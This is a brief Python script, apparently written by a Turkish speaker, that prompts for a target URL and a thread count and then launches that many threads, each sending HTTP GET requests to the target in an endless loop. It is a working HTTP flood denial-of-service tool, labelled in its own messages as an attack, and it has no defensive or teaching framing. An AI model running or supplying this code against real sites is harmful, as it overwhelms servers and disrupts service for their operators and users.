import threading
import requests

target = input("Hedef URL: ")
thread_count = int(input("Thread Sayısı (örn: 100): "))

def attack():
    while True:
        try:
            r = requests.get(target)
            print(f"İstek Gönderildi! Durum: {r.status_code}")
        except:
            print("Sunucu Cevap Vermiyor!")

print(f"[*] Saldırı Başlatılıyor: {target}")

for i in range(thread_count):
    t = threading.Thread(target=attack)
    t.start()